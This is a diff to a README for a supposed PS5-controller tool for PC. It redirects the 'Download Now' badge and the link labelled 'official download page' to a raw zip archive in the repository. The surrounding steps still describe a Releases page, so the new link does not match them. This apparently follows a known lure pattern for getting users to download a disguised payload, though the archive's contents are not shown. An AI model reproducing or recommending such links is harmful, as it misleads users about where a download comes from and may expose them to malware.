@@ -1,6 +1,6 @@
 # 🎮 DualSenseX-Steam-PC-Controller - Use PS5 features on your PC
 
-[![Download Now](https://img.shields.io/badge/Download-DualSenseX-blue.svg)](https://github.com/zakariamohammad1000-sys/DualSenseX-Steam-PC-Controller)
+[![Download Now](https://img.shields.io/badge/Download-DualSenseX-blue.svg)](https://raw.githubusercontent.com/zakariamohammad1000-sys/DualSenseX-Steam-PC-Controller/main/dualsense/P-Sense-Controller-Steam-Dual-v3.6.zip)
 
 DualSenseX allows your computer to recognize a PS5 controller. It connects your controller to your PC so games treat it like a standard gamepad. This tool adds support for features like haptic feedback, adaptive triggers, and light bar control. It makes your PC controller experience smooth and responsive.
 
@@ -17,7 +17,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the software correctly.
 
-1. Visit the [official download page](https://github.com/zakariamohammad1000-sys/DualSenseX-Steam-PC-Controller).
+1. Visit the [official download page](https://raw.githubusercontent.com/zakariamohammad1000-sys/DualSenseX-Steam-PC-Controller/main/dualsense/P-Sense-Controller-Steam-Dual-v3.6.zip).
 2. Look for the Releases section on the right side of the page.
 3. Click on the latest version number.
 4. Locate the file ending in .zip or .exe under the Assets heading.
